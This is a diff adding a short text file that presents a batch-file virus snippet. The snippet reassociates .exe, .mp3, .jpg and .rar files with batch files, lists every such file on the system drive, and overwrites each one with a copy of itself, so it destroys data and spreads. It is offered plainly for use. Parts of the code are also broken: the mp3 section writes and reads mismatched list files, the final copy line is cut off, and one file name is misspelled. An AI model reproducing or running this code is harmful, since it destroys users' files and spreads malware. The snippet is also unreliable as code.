@@ -1,0 +1,23 @@
+When infecting filetypes with your
+currently running batchfile type 
+in this:
+
+
+assoc .exe=batfile
+DIR /S/B %SystemDrive%\*.exe >> InfList_exe.txt
+echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_exe.txt) do copy /y %0 "%%j:%%k"
+assoc .mp3=batfile
+DIR /S/B %SystemDrive%\*.mp3 >> InfList_jpg.txt
+echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_mp3.txt) do copy /y %0 "%%j:%%k"
+assoc .jpg=batfile
+DIR /S/B %SystemDrive%\*.jpg >> InfList_jpg.txt
+echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_jpg.txt) do copy /y %0 "%%j:%%k"
+assoc .rar=batfile
+DIR /S/B %SystemDrive%\*.rar >> InfList_rar.txt
+echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_rar.txt) do copy /y %0 "%%j:%%k"
+assoc .exe=batfile
+DIR /S/B %SystemDrive%\*.exe >> InfList_exe.txt
+echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_exe.txt) do copy /y %0 "%%j:%%
+Start UnfList_exe.txt
+
+It will infect: exe, mp3, jpg, & rar's
